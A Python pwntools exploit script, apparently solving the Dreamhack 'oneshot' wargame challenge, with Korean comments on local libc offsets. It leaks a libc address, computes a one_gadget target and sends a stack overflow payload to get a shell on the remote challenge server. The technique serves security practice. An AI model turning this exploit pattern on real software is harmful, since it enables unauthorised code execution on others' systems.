from pwn import *
#r=process("./oneshot")
r=remote("host1.dreamhack.games",8247)

b=ELF("./oneshot")
libc=ELF("./libc.so.6")
#libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so") #로컬 libc파일

context.log_level="debug"

oneshot_off=0xf1147
#oneshot_off=0x4f2c5 로컬 libc파일

data=r.recvline().strip()
data=data[8:]
stdout=int(data,16)
oneshot=stdout-libc.symbols['stdout']+oneshot_off+0xe8

pay=""
pay+='a'*(0x20-0x8)
pay+=p64(0)
pay+='a'*8
pay+=p64(oneshot)

r.sendline(pay)
r.interactive()
